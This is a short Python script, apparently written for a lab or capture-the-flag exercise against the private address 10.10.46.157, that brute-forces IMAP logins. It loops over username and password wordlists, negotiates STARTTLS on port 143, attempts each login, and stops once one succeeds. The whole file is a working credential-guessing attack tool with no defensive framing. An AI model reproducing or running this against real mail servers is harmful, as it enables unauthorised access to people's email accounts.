import imaplib
import ssl

host = '10.10.46.157'
port = 143

username_file = '../wordlist/username.txt'
password_file = '../wordlist/password.txt'

with open(username_file) as uf, open(password_file) as pf:
    usernames = uf.read().splitlines()
    passwords = pf.read().splitlines()

for user in usernames:
    for pwd in passwords:
        try:
            print(f"\n[*] Trying: {user}:{pwd}")
            mail = imaplib.IMAP4(host, port)
            print("[*] Connected. Sending STARTTLS...")

            mail.starttls()
            print("[*] STARTTLS negotiation successful.")

            typ, response = mail.login(user, pwd)
            print(f"[+] LOGIN SUCCESS! {user}:{pwd}")
            print(f"[+] Server response: {typ} - {response}")
            mail.logout()
            exit(0)

        except imaplib.IMAP4.error as e:
            print(f"[-] LOGIN FAILED: {e}")
        except Exception as e:
            print(f"[!] Unexpected error: {e}")
